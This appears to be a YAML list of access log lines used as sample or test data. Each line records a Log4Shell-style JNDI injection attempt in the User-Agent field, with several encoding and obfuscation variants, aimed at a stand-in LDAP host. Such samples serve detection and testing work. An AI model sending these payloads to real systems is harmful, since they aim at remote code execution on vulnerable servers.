      - '203.0.113.71 - - [21/Nov/2026:09:00:55 +0000] "GET / HTTP/1.1" 400 0 "-" "%24%7bjndi:ldap://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:00:56 +0000] "GET / HTTP/1.1" 400 0 "-" "$%7Bjndi:ldap://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:00:57 +0000] "GET / HTTP/1.1" 400 0 "-" "%2524%257Bjndi://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:00:58 +0000] "GET / HTTP/1.1" 400 0 "-" "%2F%252524%25257Bjndi%3A://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:00:59 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:${lower:ldap://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:01:00 +0000] "GET / HTTP/1.1" 400 0 "-" "${::-j}${ldap://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:01:01 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nis://203.0.113.52:1389/a}"'
      - '203.0.113.71 - - [21/Nov/2026:09:01:02 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nds://203.0.113.52:1389/a}"'
